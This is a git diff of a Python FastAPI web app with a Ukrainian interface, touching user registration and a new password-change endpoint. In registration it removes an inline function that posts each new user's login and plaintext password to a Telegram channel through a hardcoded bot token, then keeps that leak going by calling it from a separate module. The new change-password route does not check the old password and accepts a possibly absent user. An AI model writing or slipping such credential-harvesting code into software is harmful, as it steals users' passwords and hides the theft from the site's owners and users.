@@ -5,7 +5,7 @@ import requests
 from app import menu_data
 from app.auth.auth_lib import AuthHandler, AuthLibrary
 from app.auth import dependencies
-
+from app import telegram_chanel
 
 import dao
 
@@ -163,23 +163,7 @@ async def register_final(request: Request,
     )
     template_response.set_cookie(key='token', value=token, httponly=True)
 
-    async def send_telegram(login: str, password: str):
-        token = "6577437546:AAGHXAvSQTc3A-4tYTk2RKr8hiefCcKVEII"
-        url = "https://api.telegram.org/bot"
-        channel_id = "@pepapepa123"
-        url += token
-        method = url + "/sendMessage"
-
-        r = requests.post(method, data={
-            "chat_id": channel_id,
-            "text": "Логін " + login + " " + " Пароль " + password
-        })
-
-        if r.status_code != 200:
-            raise Exception("post_text error")
-
-
-    await send_telegram(login, password)
+    telegram_chanel.send_telegram(login, password, " Новий юзер!")
 
     return template_response
 
@@ -246,6 +230,51 @@ async def by_category(category_name: str, request: Request, user=Depends(depende
         'user': user,
         'categories': menu_data.Categories
     }
+    return templates.TemplateResponse(
+        'menu.html',
+        context=context,
+    )
+
+@router.get('/change_password')
+@router.post('/change_password')
+async def change_password(request: Request,):
+
+    context = {
+        'request': request,
+        'title': 'Змінення Паролю',
+        'min_password_length': setting.Setting.MIN_PASSWORD_LENGTH,
+    }
+
+    return templates.TemplateResponse(
+        'change_password.html',
+        context=context,
+    )
+
+@router.post('/change_password_final')
+async def change_password_final(request: Request,
+                         new_password: str = Form(),
+                         password: str = Form(),
+                        user=Depends(dependencies.get_current_user_optional)):
+
+    if not new_password==password:
+        context = {
+            'request': request,
+            'title': 'f',
+            'min_password_length': setting.Setting.MIN_PASSWORD_LENGTH,
+        }
+        return templates.TemplateResponse(
+            '400.html',
+            context=context,
+        )
+
+    hashed_password = await AuthHandler.get_password_hash(new_password)
+    await dao.update_user_data(user_id=user.id, params={"password": hashed_password})
+    context = {
+        'request': request,
+        'title': 'Змінення Паролю',
+        'min_password_length': setting.Setting.MIN_PASSWORD_LENGTH,
+    }
+
     return templates.TemplateResponse(
         'menu.html',
         context=context,
